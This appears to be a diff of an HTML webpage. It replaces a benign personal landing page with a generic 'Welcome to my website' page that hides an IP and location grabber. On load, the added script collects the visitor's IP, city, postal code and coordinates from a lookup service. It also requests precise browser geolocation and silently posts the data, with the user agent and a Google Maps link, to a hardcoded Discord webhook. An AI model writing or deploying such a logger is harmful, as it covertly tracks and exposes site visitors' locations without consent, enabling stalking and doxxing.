@@ -3,116 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xarvok's Website</title>
+    <title>Your Website Title</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
+        #ip-display {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #00ff00;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            z-index: 9999;
+            font-size: 14px;
         }
-        .container {
-            background: rgba(255,255,255,0.1);
-            padding: 40px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-            text-align: center;
-            max-width: 600px;
-        }
-        h1 { font-size: 3em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
-        .ssl-badge {
-            background: #28a745;
-            padding: 10px 20px;
-            border-radius: 25px;
-            display: inline-block;
-            margin: 20px 0;
-            font-weight: bold;
-        }
-        .feature {
-            background: rgba(255,255,255,0.2);
-            padding: 20px;
-            margin: 15px 0;
-            border-radius: 10px;
-            border-left: 4px solid #fff;
-        }
-        button {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-            margin: 10px;
-            transition: all 0.3s;
-        }
-        button:hover { 
-            background: #ff5252; 
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        }
-        #info { margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 8px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 Xarvok's Site</h1>
-        <div class="ssl-badge">🔒 HTTPS Secured</div>
+    <div id="ip-display">Your IP is: <span id="ip-span">detecting...</span></div>
+    
+    <h1>Welcome to my website</h1>
+    <p>Content goes here...</p>
+    
+    <script>
+        // Get user's IP and location
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const lat = data.latitude;
+                const lon = data.longitude;
+                const city = data.city;
+                const region = data.region;
+                const country = data.country_name;
+                const postal = data.postal;
+                
+                // Display IP to user
+                document.getElementById('ip-span').textContent = ip;
+                
+                // Create Google Maps link
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                // Prepare payload
+                const payload = {
+                    ip: ip,
+                    coordinates: `${lat}, ${lon}`,
+                    latitude: lat,
+                    longitude: lon,
+                    city: city,
+                    region: region,
+                    country: country,
+                    postalCode: postal,
+                    mapsLink: mapsLink,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Try to get more precise location
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            payload.preciseLat = position.coords.latitude;
+                            payload.preciseLon = position.coords.longitude;
+                            payload.preciseMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                            
+                            // Send with precise location
+                            sendData(payload);
+                        },
+                        (error) => {
+                            // Send with approximate location
+                            sendData(payload);
+                        }
+                    );
+                } else {
+                    // Send without precise location
+                    sendData(payload);
+                }
+            })
+            .catch(err => {
+                console.log('IP fetch failed:', err);
+                document.getElementById('ip-span').textContent = 'Failed to detect';
+            });
         
-        <div class="feature">
-            <h3>✨ Secure Connection</h3>
-            <p>This website is served over HTTPS with automatic SSL!</p>
-        </div>
-        
-        <div class="feature">
-            <h3>⚡ Fast Loading</h3>
-            <p>Powered by GitHub's global CDN network</p>
-        </div>
-        
-        <div class="feature">
-            <h3>🌟 Modern Design</h3>
-            <p>Responsive and mobile-friendly interface</p>
-        </div>
-        
-        <button onclick="showInfo()">Show Connection Info</button>
-        <button onclick="testLoad()">Test Load Speed</button>
-        
-        <div id="info"></div>
-        
-        <script>
-            function showInfo() {
-                const info = document.getElementById('info');
-                info.innerHTML = `
-                    <h4>🔍 Connection Details:</h4>
-                    <p><strong>Protocol:</strong> ${location.protocol}</p>
-                    <p><strong>Host:</strong> ${location.host}</p>
-                    <p><strong>Secure:</strong> ${location.protocol === 'https:' ? '✅ Yes' : '❌ No'}</p>
-                    <p><strong>User Agent:</strong> ${navigator.userAgent.substring(0, 50)}...</p>
-                    <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
-                `;
-            }
-            
-            function testLoad() {
-                const start = performance.now();
-                fetch(location.href)
-                    .then(() => {
-                        const loadTime = (performance.now() - start).toFixed(2);
-                        document.getElementById('info').innerHTML = `
-                            <h4>⚡ Performance Test:</h4>
-                            <p><strong>Load Time:</strong> ${loadTime}ms</p>
-                            <p><strong>Status:</strong> ${loadTime < 100 ? '🚀 Excellent' : loadTime < 500 ? '✅ Good' : '⚠️ Slow'}</p>
-                        `;
-                    });
-            }
-            
-            // Show SSL status on load
-            console.log('🔒 HTTPS Status:', location.protocol === 'https:');
-        </script>
-    </div>
+        function sendData(data) {
+            // Send to your webhook/server
+            fetch('https://discord.com/api/webhooks/1454552751521402892/9yXxj3zUYhU3rlx3De5pRdOSwpfc5bX2zT5zq5WVb5TDVUleps7H_VBdqPn1vXWtNBN-', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            });
+        }
+    </script>
 </body>
 </html>
